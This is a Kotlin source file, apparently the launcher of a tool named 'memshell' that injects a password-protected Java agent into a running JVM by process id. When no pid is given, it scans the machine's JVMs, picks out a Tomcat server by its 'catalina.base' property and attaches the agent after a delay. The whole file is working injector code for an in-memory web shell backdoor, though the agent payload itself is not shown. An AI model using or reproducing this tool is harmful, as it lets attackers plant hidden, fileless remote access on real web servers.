package com.xhstormr.app

import com.sun.tools.attach.VirtualMachine
import java.util.concurrent.TimeUnit
import net.bytebuddy.agent.ByteBuddyAgent

fun main(args: Array<String>) {

    if (args.size != 2) {
        println("Usage: memshell <pid> <pass>")
        return
    }

    val pid = args[0].toLong()
    val arg = args[1]
    val agent = getCurrentJar()
    val currentPID = getCurrentPID()

    if (pid != 0L) {
        ByteBuddyAgent.attach(agent, pid.toString(), arg)
    } else {
        while (true) {
            println("Scanning...")
            VirtualMachine.list()
                .filter { it.id() != currentPID.toString() }
                .forEach {
                    val vm = VirtualMachine.attach(it)
                    val isTomcat = try {
                        vm.systemProperties.containsKey("catalina.base")
                    } finally {
                        vm.detach()
                    }

                    if (isTomcat) {
                        println(it)
                        TimeUnit.SECONDS.sleep(30)
                        ByteBuddyAgent.attach(agent, it.id(), arg)
                        return
                    }
                }
            TimeUnit.MINUTES.sleep(1)
        }
    }
}
